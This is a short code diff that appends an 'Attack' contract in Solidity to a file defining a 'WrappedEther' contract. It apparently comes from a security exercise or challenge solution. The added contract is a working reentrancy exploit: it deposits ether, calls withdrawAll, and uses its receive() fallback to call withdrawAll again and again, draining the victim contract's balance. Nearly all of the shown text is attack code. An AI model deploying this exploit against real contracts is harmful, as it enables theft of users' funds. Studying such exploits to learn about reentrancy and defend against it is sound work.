@@ -57,3 +57,16 @@ contract WrappedEther {
         require(success, "failed to send ether");
     }
 }
+
+contract Attack {
+    function attack(WrappedEther instance) payable external {
+        instance.deposit{value:msg.value}(address(this));
+        instance.withdrawAll();
+    }
+
+    receive() external payable {
+        if (msg.sender.balance > 0) {
+            WrappedEther(msg.sender).withdrawAll();
+        }
+    }
+}
